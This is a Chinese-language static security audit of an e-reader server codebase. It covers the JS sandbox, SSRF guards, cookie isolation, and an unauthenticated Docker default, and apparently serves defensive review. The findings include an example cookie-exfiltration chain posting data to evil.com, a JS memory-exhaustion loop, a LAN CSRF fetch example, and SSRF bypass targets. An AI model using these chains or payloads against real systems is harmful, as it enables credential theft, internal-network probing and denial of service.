# 07 安全与技术债务审计

> 审计对象：`E:\legadoQ-archive`（只读归档，产品版本 `0.3.0`，构建串 `0.6.x` 口径见 `product/app/build.gradle:125`）
> 审计范围：`product/app/src/main/kotlin/io/legado/**` 全部 + `product/web/src/**` + `product/Dockerfile` + `product/start.mjs`
> 审计员：安全与技术债务（Phase 0 审计小组）
> 审计时间：2026-11-17
> 全部证据路径相对于 `E:\legadoQ-archive\`

---

## 0. 方法与边界（静态审查，未实弹验证）

### 0.1 做了什么

- **只读静态审查**：`grep`/`sed` 窗口式阅读源码 + 阅读已有测试文件清单，**未运行任何代码**。
- **未发起任何攻击**：没有构造恶意书源、没有运行脚本、没有向公网或内网发请求、没有修改归档内任何文件。
- 未整读禁读区；大文件（`JsSandbox.kt` 2100 行、`JavaPackages.kt` 1415 行、`WebViewProxy.kt` 817 行、`RuleRunner.kt` 1758 行）全部先 `grep -n` 定位再读 20–100 行窗口。

### 0.2 一个必须先说清的前提（影响本文所有结论的读法）

**这个归档不是「未加固的旧代码」**。审计过程中反复遇到同一现象：源码注释里写着「以前这里是个洞，0.6.23/0.8.x 已修」，并且能在代码里找到对应的修复实现 + 对应的判据测试（`NetworkSecurityTest`、`PinnedProxyTest`、`SameOriginGuardTest`、`BindGuardTest`、`JsSandboxHostBudgetTest` 等 40 个安全向测试文件，见 §4）。

因此本审计的**主要产出不是「发现大量漏洞」**，而是：

1. 确认**已有边界确实成立**（并给出行号，供重建时逐条继承）；
2. 找出**边界之外仍存在的缝**（本次共 8 条，其中 2 条 P0/P1 级）；
3. 找出**边界依赖的隐含前提**（一旦重建破坏这些前提，防护会静默失效——这是重建最大的风险，见 §6）。

### 0.3 行号约定

所有 `文件:行号` 均通过 `grep -n` 实测定位。**行号会随重构漂移**，重建时请按符号名重新定位，不要按行号跳转。

### 0.4 未做的事（能力边界）

- 未做动态渗透测试（纪律禁止）。
- 未核对 CVE 数据库（无网络查询可用），依赖结论一律标【推断】并给出人工核对方法。
- 未审计 `product/experimental/ai/`（已不参与编译与打包，见 `product/app/src/main/kotlin/io/legado/Application.kt:176-177`）。
- 未审计前端 `web/src/**` 全部 37k 行，只按 XSS 面定向检索（`dangerouslySetInnerHTML`/`innerHTML`/`DOMParser`/`postMessage`/iframe sandbox）。

---

## 1. 威胁模型

### 1.1 资产（按价值排序）

| # | 资产 | 存放位置 | 泄漏后果 |
|---|------|----------|----------|
| A1 | **书源 Cookie / 登录态** | `cookie` 表 + `SessionCookies` 内存层（`data/CookieDao.kt:27`、`data/SessionCookies.kt:22`） | 直接接管用户在第三方站点的账号 |
| A2 | 藏书库（书架、阅读进度、笔记、书签） | SQLite `data/legado.sqlite` | 隐私画像（在读什么书） |
| A3 | 书源配置本身 | `bookSource` 表 | 含站点凭据、私有源地址 |
| A4 | 本机文件系统 | 进程权限范围 | 完全沦陷如果 JS 沙箱被逃逸 |
| A5 | 宿主网络位置 | 出站能力 | 内网探测 / 云元数据（`169.254.169.254`）/ 打本机其它服务 |
| A6 | 本机浏览器已登录态 | 通过 CDP 附着（`source/ExternalBrowserLogin.kt`） | 全站 Cookie 抓取 |

### 1.2 信任边界

```
┌──────────────────────────────────────────────────────────────┐
│ 信任区：本进程 Kotlin 代码 + 本机用户                              │
│  ┌────────────────────────────────────────────────────┐      │
│  │ 不信任：书源 JSON 里的 JS 规则（Rhino 沙箱）            │      │
│  │ 不信任：抓回来的第三方 HTML（Jsoup 解析 + 前端渲染）     │      │
│  │ 不信任：第三方站点响应（重定向、Set-Cookie、超大响应）    │      │
│  └────────────────────────────────────────────────────┘      │
│         ▲ 浏览器（同源闸门）  ▲ 局域网（绑定闸门）  ▲ 本机其它进程 │
└──────────────────────────────────────────────────────────────┘
```

### 1.3 敌手

| 敌手 | 能力 | 已有防线 | 残余风险 |
|------|------|----------|----------|
| **E1 恶意书源作者** | 能让你导入一份 JSON（诱导、聚合源夹带），里面的 JS 会以宿主进程权限执行、能发任意 HTTP 请求 | JS 沙箱（§2.1）、SSRF 闸门（§2.2） | **中**：沙箱内仍可读取该源可触达域的全部 Cookie 并外传（§2.3）；可无限次外呼（§2.2.6） |
| **E2 恶意网站**（你正在浏览的任意网页） | 能驱动你的浏览器向 `127.0.0.1:*` 发跨站请求、能做 DNS 重绑定 | 同源写闸门（`http/Guard.kt:72`）、`ServerIdentity` 绑定身份比对 | **低**：写操作被 Origin 判定拦住；只读 GET 仍可被 CSRF 读取吗？—— 跨源 JS 读不到响应（无 CORS），但 GET 的**副作用**在 `/api/sources/{id}/browser/cookies` 一类端点上为空，故实际风险低 |
| **E3 本机其它进程**（含别的用户的进程，若多用户机） | 能直连回环端口，**不带 Origin 即通过全部写闸门** | 无（设计上放弃） | **高但接受**：`http/Guard.kt:79-80` 无 Origin 直接放行。文档明示（`AppConfig.kt:212-220`） |
| **E4 局域网邻居** | 仅当 `LEGADO_ALLOW_EXTERNAL_BIND=1` 或 Docker 部署时可达 | 启动期绑定闸门 `http/Guard.kt:148`；放行时打警告 `Application.kt:144-153` | **高**：容器镜像默认外部绑定 + 零鉴权（§2.4.1、§2.4.4） |
| **E5 抓取的第三方页面内容** | 提供任意 HTML/JS 给内置浏览器代理、任意图片/正文给阅读器 | iframe sandbox（无 `allow-same-origin`）、SVG 全面拒绝、前端零 `dangerouslySetInnerHTML` | **低**：见 §2.5 |

---

## 2. 安全发现（按攻击面）

等级定义：**P0** = 重建时必须解决，否则设计上就不该发布；**P1** = 现有部署真实可被利用，应尽快修；**P2** = 需要特定前置条件或影响有限；**P3** = 加固建议 / 纵深防御缺失。

---

### 2.1 攻击面 A1：JS 沙箱逃逸

#### 结论先行

**未发现可用的沙箱逃逸路径。** 这是本审计最重要的结论之一：`JsSandbox` + `JavaPackages` 的设计是「**白名单 + 不往沙箱里放任何真实 Java 引用**」，而不是「塞一个完整 Java 桥再打补丁」。这个方向是对的，重建时必须保留。

#### 2.1.1 沙箱到底限制了什么（逐项，带证据）

| 限制项 | 实现 | 证据 |
|--------|------|------|
| **Java 反射全禁** | `cx.setClassShutter(ClassShutter { false })` —— 任何 Java 类名解析失败 | 【事实】`rules/JsSandbox.kt:303` |
| 不用 Rhino 的 `ImporterTopLevel` | 用 `initSafeStandardObjects()`（不含 `Packages`/`getClass` 的默认放行） | 【事实】`rules/JsSandbox.kt:304` |
| **类白名单（显式 45 个）** | `CLASS_NAMES` 是 `Set<String>`，未列出的类名走 `else -> error("未实现的 Java 白名单类")` | 【事实】`rules/JavaPackages.kt:1385-1403`（白名单）、`rules/JavaPackages.kt:644`（默认拒绝） |
| **不放真实 Java 对象** | `okhttp3.Request.Builder.build()` 曾经挂 `"_request" to request.copy(...)`（真 `RequestData` 实例），已改成挂 4 个原生值；注释记录这条不变量 | 【事实】`rules/JavaPackages.kt:1166-1180` |
| **墙钟超时** | Rhino 解释器模式（`optimizationLevel = -1`）+ `observeInstructionCount` 每 20000 条指令查一次 deadline | 【事实】`rules/JsGuard.kt:44-48`、`rules/JsGuard.kt:63-64`、`rules/JsGuard.kt:90` |
| 超时可配 | `LEGADO_JS_TIMEOUT_MS`，默认 30000ms | 【事实】`AppConfig.kt:148` |
| **递归爆栈保护** | `maximumInterpreterStackDepth = 1000`（否则深递归抛 `StackOverflowError`，`Error` 不是 `Exception`，`runCatching` 兜不住） | 【事实】`rules/JsGuard.kt:76`、`rules/JsGuard.kt:91` |
| **宿主内存预算** | `chargeHostBytes`，默认 64MB/次执行，超限抛 `IllegalArgumentException` | 【事实】`rules/JsGuard.kt:132-144`、`AppConfig.kt:162`、`AppConfig.kt:176-179` |
| **阻塞 API 封顶** | `Thread.sleep` 夹到 `MAX_SLEEP_MS = 1000`（否则 `Packages.java.lang.Thread.sleep(999999)` 占死工作线程且墙钟守卫看不见） | 【事实】`rules/JavaPackages.kt:240-258`、`rules/JavaPackages.kt:1409` |
| **`System.getenv` 已移除** | 只留 `currentTimeMillis` / `nanoTime` / `getProperty("java.version")` | 【事实】`rules/JavaPackages.kt:261-276`（注释在 :272） |
| **解压炸弹** | `GzipLimits.unzipBounded` 流式记账，16MB 上限 | 【事实】`rules/GzipLimits.kt:45-60` |
| **单次分配上限** | `MAX_HOST_ALLOC_BYTES = 8MB`，挡 `Arrays.equals({length:2147483000})` 这类 2GB 申请 | 【事实】`rules/JavaPackages.kt:1366`、`rules/JavaPackages.kt:1356-1364` |

#### 2.1.2 危险类是否存在（逐项回答任务书所列）

| 危险类 | 是否暴露 | 证据 |
|--------|----------|------|
| `Runtime` / `Runtime.exec` | **否**（不在白名单，`ClassShutter{false}` 也拦） | 【事实】`rules/JavaPackages.kt:1385-1403` 全列表 |
| `ProcessBuilder` | **否** | 【事实】同上 |
| `java.io.File` / `Files` / `FileInputStream` | **否**（`java.io` 整个包不在白名单，`PACKAGE_CLASSES` 无 `java.io`） | 【事实】`rules/JavaPackages.kt:1405`（`PACKAGE_CLASSES` 由白名单反推，故命名空间也自动不含 `java.io`） |
| `Class.forName` / `getClass()` | **否**（ClassShutter 全禁；且没有任何白名单类成员返回 `Class`） | 【事实】`rules/JsSandbox.kt:303` |
| `System.exit` | **否**（`java.lang.System` 只挂了 3 个静态方法） | 【事实】`rules/JavaPackages.kt:261-276` |
| 网络类（`java.net.Socket`/`HttpURLConnection`/`URL`） | **否**（`java.net` 只有 `URLEncoder`/`URLDecoder`；脚本里的 `java.toURL()` 是**假对象**，只提供 `.host`/`.origin`/`.pathname`/`.searchParams` 读属性） | 【事实】`rules/JavaPackages.kt:1441,1448`、`rules/JsSandbox.kt:763`、`rules/JsSandbox.kt:1364` |
| `Unsafe` | **否** | 【事实】白名单 |
| `okhttp3.OkHttpClient` | **是，但是假对象**：`newCall().execute()` 内部走 `executeRequest` → `RuleRunner` 的**受控** client（带 SSRF 闸门与 deadline） | 【事实】`rules/JavaPackages.kt:1208`、`rules/JavaPackages.kt:1242-1252` |
| `javax.crypto.*` / `MessageDigest` / `SecureRandom` | **是**（有意开放，书源解密必需），有密钥材料登记表与 1024 条上限 | 【事实】`rules/JavaPackages.kt:457-533`、`rules/JavaPackages.kt:1375` |

#### 2.1.3 已知/可疑逃逸路径逐条判定

| 路径 | 判定 | 证据 / 理由 |
|------|------|-------------|
| `getClass().forName(...)` 反射 | **不可行** | 【事实】ClassShutter 对一切类名返回 false（`JsSandbox.kt:303`）；且沙箱里不存在 `NativeJavaObject` 包装的真实对象 |
| `Thread` 占线程 | **已被封顶** | 【事实】`JavaPackages.kt:240-258` 把 sleep 夹到 1s；`currentThread` 只返回一个假对象 |
| `Unsafe` / `sun.misc.*` | **不可行** | 【事实】白名单外 |
| `load()` / `eval(Reload(url))` 加载**别人的**脚本 | **可行，且是设计允许的** | 【事实】`JsSandbox.kt:347-354`：`Reload(url)` 用同一套抓取通道把远端 JS 当**字符串**返回，执行权交给书源自己的 `eval`。**含义**：一个被信任的书源可以把任意远端代码拉进沙箱执行 → 信任边界实际上从「这份书源」扩大到了「这份书源运行时引用的所有远端脚本」。注释自己承认这个前提：「满足『只导入信任书源』的安全前提」（`JsSandbox.kt:346`） |
| 通过 `java.ajax` / okhttp 无限次外呼 | **可行**（无计量） | 【推断】全仓 grep `requestCount|fetchCount|ajaxCount|budget` 在 `rules/` 下**无命中**；`JsSandbox.kt:223` 的 `MAX_REMOTE_JS_LIB = 64` 只管 `Reload` 结果缓存，不是调用计数。见 §2.2.6 |
| 纯 JS 侧堆分配绕过 64MB 宿主预算 | **可能可行**【未确认，需人工验证】 | 【推断】`chargeHostBytes` 只在 3 个宿主分配闸口记账（`JsGuard.kt:122-124` 注释明说），Rhino 自身的 JS 数组/字符串分配**不记账**。`var a=[]; for(;;) a.push('x'.repeat(1<<20))` 在 30s 墙钟内可分配数 GB，先于 deadline 触发 OOM。验证方法：本地跑 `JsSandboxHostBudgetTest` 的同类判据，把预算设 `0`（不设限）再喂上述脚本，观察是否 OOM；或用 `-Xmx256m` 复现 |

#### 2.1.4 结论

- **P2 / P1（视用途）**：`Reload(url)` + `eval` 让「信任一份书源」隐式等于「信任它运行时引用的每个远端 URL」。【事实】`JsSandbox.kt:341-354`。**建议**：重建时把它拆成显式开关（默认关），或在导入时列出该源引用的远端脚本域并要求确认。**修复风险**：中——665+ 份启用源里有一批（社区漫画源）依赖它，直接关会打断真实功能。
- **P1**：无每脚本外呼次数/并发预算（§2.2.6）。
- **P3**：纯 JS 堆分配无预算（【未确认】）。

---

### 2.2 攻击面 A2：SSRF / 任意 URL

#### 2.2.1 防护架构（这是本项目最值得继承的设计）

【事实】**出站唯一入口**是 `NetworkSecurity.newHttpClient()`，它返回的不是裸 client 而是一个 `GuardedHttpClient` 包装，`send`/`sendAsync` 三个重载在真正发包前都过闸；且所有请求经本进程 `PinnedProxy`（只绑回环）——**由代理解析一次并连同一个 `InetAddress`，JDK 不再自己解析目标域名**，从而关闭 DNS TOCTOU 窗口。

- `ops/GuardedHttpClient.kt:40-65`（三个方法的 `guard(req.uri())`）
- `ops/GuardedHttpClient.kt:77-88`（闸门：`resolveAndValidateSafeHttpTarget` + 发送前复查 `validateResolvedAddresses`）
- `ops/NetworkSecurity.kt:54-69`（工厂 + `ProxySelector.of(127.0.0.1:proxyPort)`）
- `ops/NetworkSecurity.kt:71-75`（`strictProxy` / `loopbackProxy` 两个实例，**按用途分离，不用全局开关**）
- `ops/PinnedProxy.kt:203-212`（`resolveTarget`：解析一次 → `validateResolvedAddresses` → 只连这个 `InetAddress`）

#### 2.2.2 逐项判定（任务书要求的每一项）

| 检查项 | 有/无防护 | 证据 |
|--------|-----------|------|
| 非 `http(s)` 协议（`file:`/`gopher:`/`jar:`） | **有** | 【事实】`NetworkSecurity.kt:93`：`if (uri.scheme !in setOf("http","https") || uri.host.isNullOrBlank()) throw BlockedAddressException` |
| 回环 `127.0.0.0/8` / `::1` | **有**（除 AI 本机模型那条显式开关） | 【事实】`NetworkSecurity.kt:117-121`；`allowLoopback` 全仓只在 `GuardedHttpClient`/`NetworkSecurity`/`PinnedProxy` 内部流转（grep 命中 11 处全部在这 3 个文件），**无任何业务调用点传 `true`**（AI 已移出编译） |
| RFC1918 私网 | **有**（JDK 内建 + 自研补齐） | 【事实】`NetworkSecurity.kt:120`、`NetworkSecurity.kt:140-146` |
| CGNAT `100.64/10` | **有** | 【事实】`NetworkSecurity.kt:141` |
| 链路本地 `169.254/16` + 云元数据 `169.254.169.254` | **有** | 【事实】`NetworkSecurity.kt:120`、`NetworkSecurity.kt:144` |
| 基准测试段 `198.18/15`、组播 `224/4`、保留 `240/4` | **有** | 【事实】`NetworkSecurity.kt:145-146` |
| IPv6 ULA `fc00::/7`、组播 `ff00::/8`、文档段 `2001:db8::/32` | **有** | 【事实】`NetworkSecurity.kt:160-164` |
| IPv4-mapped IPv6（`::ffff:10.0.0.1` 绕过） | **有**（还原成 v4 再判） | 【事实】`NetworkSecurity.kt:155-159` |
| 重定向跳内网 | **有**（两层：client 层 `Redirect.NEVER` + 逐跳重校验） | 【事实】`NetworkSecurity.kt:56` 默认 `NEVER`；媒体 `http/MediaRoutes.kt:470,481`；WebView `source/WebViewProxy.kt:276-282`（注释直指"否则站点回 `Location: http://127.0.0.1:…` 就绕过"）；封面 `cache/CoverCache.kt:41` |
| DNS 重绑定（TOCTOU） | **有**（PinnedProxy 钉死 IP） | 【事实】`ops/PinnedProxy.kt:203-212` |
| 应用连接超时 | **有**（10s 默认） | 【事实】`NetworkSecurity.kt:55` |

#### 2.2.3 未被闸门覆盖的出站路径（本次重点）

【事实】全仓 `HttpClient.newBuilder()` 直用点共 6 处，只有 4 处业务点走 `NetworkSecurity.newHttpClient`：

| 文件:行 | 用途 | 是否过闸 | 风险 |
|---------|------|----------|------|
| `rules/RuleRunner.kt:117` | 书源全部 HTTP | ✅ `newHttpClient` | — |
| `cache/CoverCache.kt:41` | 封面/正文配图 | ✅ | — |
| `http/MediaRoutes.kt:448` | 媒体流（图/音/视频） | ✅ | — |
| `http/ReplaceRulesRoutes.kt:128` | 净化规则导入时抓远端 | ✅ | — |
| `subscription/SubscriptionService.kt:39` | 书源订阅 | ✅ | — |
| **`source/WebViewProxy.kt:60-63`** | **内置浏览器整站反代（抓任意第三方页面）** | ⚠️ 部分：入口 `validateTarget` → `resolveAndValidateSafeHttpTarget`（`:370`），**但用的是裸 client，没有 PinnedProxy** | **P1：DNS TOCTOU 重新打开**。解析通过后、真正建连前，攻击者控制的权威 DNS 可把同一域名改指 `127.0.0.1`，此时 JDK 自己再解析一次，闸门形同虚设 |
| **`tts/EdgeTtsService.kt:28-33`** | 自定义 TTS 合成 | ❌ 只校验 scheme/host | **P1：`assertSafeTtsTarget`（`:341-345`）只判 `http/https` + host 非空，完全不做 IP 段判定**，且逐跳跟随重定向时也只调这一个函数（`:361-375`）。用户填一个自定义 TTS 地址（或该地址 302 到内网）即可让服务端打内网。地址来自设置界面，攻击面 = 「诱导用户填地址」或「能被写设置的本地/局域网客户端」 |
| `source/ExternalBrowserLogin.kt:99-102` | 附着本机 Chromium CDP | ❌ | P3：目标固定 `127.0.0.1:{port}`，port 从 profile 文件读（`ExternalBrowserLogin.kt:489`）。若该文件被篡改 → SSRF 到任意本地端口。前置条件需要本机写权限，故只算纵深防御缺口 |
| `ops/UpdateCheck.kt:42-45` | 检查更新 | ❌ | P3：目标固定为 GitHub 仓库路径（`UpdateCheck.kt:40`），`Redirect.NEVER`。可接受 |
| `DesktopLauncher.kt:313,323` | 端口探活 | ❌ | P3：目标 `127.0.0.1`，可接受 |

#### 2.2.4 `file://` / 本地文件读取

【事实】**没有**通过 URL 读本地文件的路径：`NetworkSecurity.kt:93` 硬拒非 http(s)；`WebViewProxy.validateTarget`（`:361-380`）同样只认 http(s)。本地书（EPUB/TXT）走独立路由，路径来自 zip entry 名 + 正则限定的 bookId（§2.6.4）。

#### 2.2.5 局域网 / 本机自我访问

【事实】本服务自己的写闸门对「无 Origin 的请求」放行（`http/Guard.kt:79-80`），因此**能打到本服务的服务端组件 = 绕过唯一写保护**。这条被显式识别并防御：
- AI 外呼路径曾硬拒「指向这台服务自己」（`AppConfig.kt:236-241` 注释、`ServerIdentity` 的存在理由见 `ops/ServerIdentity.kt:66-72`）——但 AI 已移出编译，这条防线**当前没有任何在编调用点**。
- 【建议】重建时，若恢复任何「服务端按用户填写的 URL 出站」的能力（AI provider、webhook、自定义 TTS），必须重新接上 `refusePointingAtSelf`。

#### 2.2.6 无限外呼（新发现）

- 【事实】书源 JS 在 30s 内可发起**不受次数/并发限制**的出站请求：`java.ajax`/`java.get`/`java.post`/okhttp `newCall().execute()` 都直通 `RuleRunner.fetchResponse`，而 `rules/` 下 grep 不到任何计数器。
- **后果**：① 拿用户 IP 打第三方（DDoS 放大，一份书源 30 秒能打几千次）；② 占满 `Dispatchers.IO`（默认并行度已抬到 200，`AppConfig.kt:63`）从而拖慢整个服务；③ 与 §2.3 的 Cookie 外传组合成**带凭据的批量请求**。
- **建议**：每执行预算（如 200 次 + 20 并发），超限抛可被脚本 `runCatching` 兜住的 `Exception`。**修复风险**：低——合法源单次执行通常 3–10 次请求；但需要真库抽样确认（检索类源可能上百次分页）。

#### 2.2.7 结论

- **P1**：`WebViewProxy` 缺 PinnedProxy → DNS 重绑定下 SSRF 闸门失效。
- **P1**：自定义 TTS 出站完全没有 IP 段校验。
- **P1**：无外呼次数预算。
- 其余 SSRF 面（书源主链路、媒体代理、封面、订阅、重定向、IPv6/CGNAT/元数据）**防护完整且被测试覆盖**，重建必须原样继承。

---

### 2.3 攻击面 A3：Cookie / 凭据泄漏

#### 2.3.1 按域隔离吗？—— 是，但粒度是 eTLD+1（不是主机名）

- 【事实】桶键 = `WebViewProxy.registrableDomain(host)`，即 eTLD+1（`www.a.com` 与 `m.a.com` 同桶）：
  `data/CookieDao.kt:27-33`（`cookieBucket`）、`source/WebViewProxy.kt:422-430`（`registrableDomain` + `MULTI_PART_TLDS` 白名单，`WebViewProxy.kt:396-404`，含 `com.cn`/`co.uk` 等，避免把 `a.com.cn` 与 `b.com.cn` 混桶）。
- 【事实】读取按请求 URL 现算桶：`data/CookieDao.kt:95-100`；请求时按**每一跳的落地地址**现取：`ops/ProxyHeaders.kt:24-36`（注释明确"不能把原站的 Cookie 捎给客户方"）、`source/WebViewProxy.kt:311`。

#### 2.3.2 会不会把 A 站 Cookie 发给 B 站？

**不会（按域）。但会跨书源（按域共享）。**

- 【事实】Cookie 与书源解耦，按域全局共享（`CookieDao.kt:94` 注释「跨书源共享，与上游一致」；界面也明说「域是全局共享的」（`http/SourcesRoutes.kt:539-540`））。
- **⇒ 真实攻击链（P1，设计固有）**：
  1. 恶意书源 S（`bookSourceUrl = evil.com`）执行 `java.get('https://www.a.com/api/me')`；
  2. 宿主自动附上 `a.com` 的用户登录 Cookie（`rules/RuleRunner.kt:1392-1394`）；
  3. S 拿到 `a.com` 的账户数据，`java.post('https://evil.com/collect', 数据)` 外传。
  3 步都在沙箱允许范围内（外呼无限制，§2.2.6）。
- **唯一的软防线**是 JS `cookie` API 的域名文本判定：脚本只能读「书源配置里出现过的域」，且代码自己承认「一个铁了心的恶意源把域名写进规则串就能越过这条线」——【事实】`rules/JsSandbox.kt:367-376`、`rules/JsSandbox.kt:972-995`（`getCookie` 的 `allowed(url)`）。
- **即：真正的底线是「只导入信任书源」，这是产品方明确接受的风险。** 重建时若想提高，唯一有效手段是让 Cookie **既能按域、也能按源**隔离（per-source jar），并把共享改成显式选择——**但这会打破「登录一次、所有同域源通用」的现有体验**，属于产品决策，不是纯技术修复。

#### 2.3.3 日志里会不会打印 Cookie / token？

- 【事实】全仓 grep `log(... *cookie|"cookie" to|token" to` **零命中**。
- 【事实】唯一的 Cookie 相关日志只记数量与 URL，不记值：`http/SourcesRoutes.kt:459`（`"cookie synchronized for source: {}, count: {}, url: {}"`）。
- 【事实】但 `ops/LogService.kt` **没有任何脱敏（redact/mask）机制**（grep `redact|mask|脱敏` 零命中），且 `GET /api/system/logs` 无鉴权可读（`http/system/SystemRoutes.kt:80-89`）。⇒ 只要将来有人写一句 `log.info("headers={}", headers)`，凭据就会明文进库并可被前端读出。**P2：缺一个「日志脱敏白名单」基础设施。**
- 【推断】`SourcesRoutes.kt:459` 记录的 `req.url` 若带 query token（很多站点把 token 放查询串），会明文落库。

#### 2.3.4 备份包里是否明文带凭据？

- 【事实】**本产品导出侧不含 Cookie**：`backup/BackupExporter.kt` 的条目常量只有 `bookSource.json`/`bookshelf.json`/…（`:40`、`:52`），grep `cookie` 在 `BackupExporter.kt` **零命中**。
- 【事实】导入侧（兼容上游手机备份）**能**读 `cookies.json`，走 `AES/ECB/PKCS5` + **`MD5(密码)` 十六进制串取前 16 字符**作密钥（`backup/BackupImporter.kt:55-77`）。这是**上游口径的照抄**，不是本项目自选。
- 【事实】会话 Cookie（`Set-Cookie` 无 `Max-Age`/`Expires`）只在内存，不进库、不进备份：`data/SessionCookies.kt:14-20`、`SessionCookies.kt:22-25`。

#### 2.3.5 前端能否读到任意域 Cookie？

- 【事实】能读到**特定书源**关联域的全部明文 Cookie：`GET /api/sources/{id}/browser/cookies` 直接回 `cookies = jar`（`http/SourcesRoutes.kt:536-543`）。该端点是 GET，不经过写闸门，也**不校验 Origin**。
- 后果评估：跨源 JS 读不到响应（无 CORS 头），所以浏览器侧不可利用；但**任何能直连端口的客户端**（E3/E4）可读。与「服务无身份」的总体设计一致，不额外降低安全性，但它是**凭据明文出网**的一条路径，重建时应考虑至少在绑定非回环时禁用或加 token。

#### 2.3.6 结论

- **P1**：跨源凭据外传链（恶意源 → 读任意域 Cookie → 外传）——设计固有，建议 per-source jar 作为产品级选项。
- **P2**：日志无脱敏基础设施。`GET .../browser/cookies` 明文回 Cookie 且无鉴权。
- **P3**：`registrableDomain` 的 eTLD+1 近似对未列入 `MULTI_PART_TLDS` 的私有后缀（如 `*.github.io`、`*.s3.amazonaws.com`）会把不相关站点混桶。见 §5 的文档漂移条目（注释声称按完整主机存，实际是 eTLD+1）。

---

### 2.4 攻击面 A4：服务暴露面

#### 2.4.1 默认监听与端口

- 【事实】默认 `LEGADO_HOST=127.0.0.1`、`LEGADO_PORT=8080`（裸跑 jar）：`ServerConfig.kt:48`、`ServerConfig.kt:51`。
- 【事实】产品入口 1234 来自启动器，不是服务端默认：`docs/ARCHITECTURE.md:204-205` 有正确记载。
- 【事实】非回环绑定必须显式放行，否则**拒绝启动**（不是拒绝请求）：`http/Guard.kt:148-156`，调用点 `Application.kt:138`，放行时写警告日志 `Application.kt:144-153`。这条设计判断（"要么别开，要么开了就别假装安全"）是对的。

#### 2.4.2 **P0：容器镜像默认把整库交给任何人**（本次最严重的发现）

```
product/Dockerfile:50
ENV LEGADO_DATA_DIR=/data LEGADO_PORT=8080 LEGADO_HOST=0.0.0.0 LEGADO_ALLOW_EXTERNAL_BIND=1
```
- 【事实】镜像**默认**外部绑定 + 自动放行 + **零鉴权**（全仓无账号/token/会话校验：`http/Guard.kt:15-20` 明说"这台服务不设身份"）。
- **后果**：任何拉镜像跑起来的人（或任何 `docker run` 的公有云模板），在 8080 端口上对同网段/公网暴露**完整读写权限**：改书源、删书、读全部 Cookie 明文（§2.3.5）、读日志、改端口、写品牌。
- **这是设计选择而非 bug**（注释与文档都承认），但对"重建"来说必须重新决策：**P0**，因为它把「本地单人软件」的威胁模型直接换成了「匿名公网服务」。
- **建议**（重建时至少三选一）：① 外部绑定时强制要求一个 token（哪怕自动生成写进日志）；② Dockerfile 不再默认 `LEGADO_HOST=0.0.0.0`，改为 compose 示例显式给出；③ 外部绑定时默认只读 + 显式 `--allow-write`。
- **修复风险**：中——会改变现有 Docker 用户的启动方式。

#### 2.4.3 同源写闸门（CSRF 防线）的强度

【事实】机制：
1. 全局插件 `SameOriginWriteGate` 装在 routing 之前（`Application.kt:273`），拦所有非 `GET/HEAD/OPTIONS`（`http/Guard.kt:72-96`）；
2. 判定对象是**服务端真实绑定身份** `ServerIdentity`（`ops/ServerIdentity.kt:74-78`），不是请求的 `Host` 头 —— 因为 DNS 重绑定会让两者相等（`Guard.kt:22-25` 记录了 0.6.23 的这次修正）；
3. 路由内 `requireSameOriginWrite()` 第一件事检查「响应是否已被插件写成 403」，实现真正的阻断（Ktor `onCall` 不阻断 pipeline，`Guard.kt:91-94`、`Guard.kt:105-106`）；
4. 只读 POST 白名单手写（`Guard.kt:39-44`），注释解释为何不能用端点目录自动生成（`/api/tts/session*` 标 `write=false` 却会建会话）。

【事实】**两个明确的放行缺口**：
- **无 `Origin` 头 = 放行**（`Guard.kt:79-80`、`Guard.kt:108`）。curl、本机其它进程、以及任何非浏览器客户端完全不受保护。设计上接受（E3）。
- `handlesOwnOriginPolicy` 让 `/api/sources/*/login-cookie` 绕过全局闸门（`Guard.kt:57-58`），改由路由自己的 `allowCookieSyncOrigin` 判定（`http/SourcesRoutes.kt:772-784`）。该函数：无 Origin → 放行（`:773`）；有 Origin → 必须命中书源配置里的注册域。**判定本身合理**，但它意味着**这条写端点的安全性完全押在一个函数上**，没有任何第二道闸。

【推断】**`0.0.0.0` 绑定下的同源判定被削弱**：`isOwnOriginHost` 在配置为 `0.0.0.0`/`::` 时，对**任意私有 IP 字面量**都返回 true（`Guard.kt:177`、`Guard.kt:184-190`）。于是当服务绑 `0.0.0.0:8080` 时，**局域网内另一台机器**上 `http://192.168.1.99:8080` 这个页面发起的写请求，其 Origin 会被判为「同源」而放行。→ 局域网邻居可以在自己的网页里 CSRF 这台服务。**这是 2.4.2 的放大器**：Docker 默认配置下，同源闸门对局域网基本失效。验证方法：静态已足够（代码路径确定）；若需实证，在局域网另一台机器上起一个 8080 端口的页面，`fetch('http://target:8080/api/shelf/...', {method:'POST'})`，观察是否 200。

#### 2.4.4 `/api/agent/*` 下线后的残留

- 【事实】AI 子系统（含 `/api/agent` 路由）2026-11-17 移到 `product/experimental/ai/`，不参与编译（`Application.kt:176-177`、AGENTS.md §8.2）。
- 【事实】但**三处残留**：
  1. `http/Guard.kt:41-43`：`READ_ONLY_POSTS` 仍列 `/api/agent/sources/validate`、`/api/agent/comprehend`、`/api/agent/chat` —— 这三条 POST **永久免写闸门**。若将来 AI 恢复且这些端点真能触发工具调用（其中 `chat` 历史上可写库），它们会**直接绕过唯一写保护**。**P2（潜在）**。
  2. `ServerConfig.kt:30`：`aiEnabled` 默认 `true`，但已无路由可注册；`/healthz` 会回 `ai: true`（`Application.kt:287`）——**对外谎报能力**。P3。
  3. `agent-api.json`（`count = 144`）仍被 `RouteCatalog` 原样服务（`http/system/SystemRoutes.kt:49-57`），描述的是**已不存在的 144 端点**。P3。

#### 2.4.5 CORS

- 【事实】无全局 CORS 插件（`Application.kt:221-243` 只装 ContentNegotiation/Compression/WebSockets/StatusPages）。
- 【事实】两处手工 CORS：
  - `http/SourcesRoutes.kt:796`：`respondProxied` 对**所有**内置浏览器代理响应加 `Access-Control-Allow-Origin: *`。注释理由是"iframe 处于 sandbox 不透明源下，且这些端点由一次性令牌鉴权"。【推断】`*` + 同源 HTML 内容叠加，意味着**任何网页**都能 `fetch` 到代理页面内容——**前提是拿到那 24 字节随机令牌**（`WebViewProxy.kt:83-85`，`SecureRandom`）。令牌在一次会话内有效（TTL 30 分钟）。风险评估：**P3**，因为令牌不可猜；但令牌在 URL 里（`?t=…`），会进浏览器历史与 Referer。
  - `http/SourcesRoutes.kt:780-781`：`login-cookie` 回显具体 Origin + `Vary: Origin`（正确做法）。
- 【事实】`X-Content-Type-Options: nosniff` 只在媒体/EPUB 资源端点设置（`MediaRoutes.kt:75,122,237,253`），**HTML 主文档与静态资源未设**。P3。

#### 2.4.6 静态文件服务 / 路径穿越

- 【事实】`/` 只服务 **classpath** 里的 `static/`（`StaticWeb.kt:262` `staticResources("/", "static")`），不碰磁盘。
